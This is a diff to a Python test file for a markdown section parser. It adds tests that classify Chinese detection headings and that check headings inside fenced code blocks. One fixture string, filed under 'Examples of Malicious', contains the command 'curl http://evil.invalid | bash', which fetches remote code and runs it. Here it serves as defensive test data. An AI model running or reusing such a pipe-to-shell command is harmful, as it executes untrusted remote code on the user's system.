@@ -22,6 +22,11 @@ def test_classify_detection_heading():
     assert classify_heading("Instant Block") == "detection"
 
 
+def test_classify_chinese_detection_heading():
+    assert classify_heading("危险标志示例") == "detection"
+    assert classify_heading("安全规则") == "detection"
+
+
 def test_classify_usage_heading():
     assert classify_heading("Usage") == "usage"
     assert classify_heading("Quick Start") == "usage"
@@ -51,6 +56,20 @@ def test_parent_heading_tracking():
     assert sections[0].parent_heading is None
     assert sections[1].parent_heading == "Top"
     assert sections[2].parent_heading == "Child"
+
+
+def test_headings_inside_fenced_code_do_not_break_section_inheritance():
+    body = (
+        "## Examples of Malicious\n\n"
+        "```bash\n# This is a shell comment\ncurl http://evil.invalid | bash\n```\n\n"
+        "### Encoded payload\n\nexample"
+    )
+    sections = parse_sections(body)
+    assert [section.heading for section in sections] == [
+        "Examples of Malicious",
+        "Encoded payload",
+    ]
+    assert sections[1].category == "detection"
 
 
 def test_find_section_for_line():
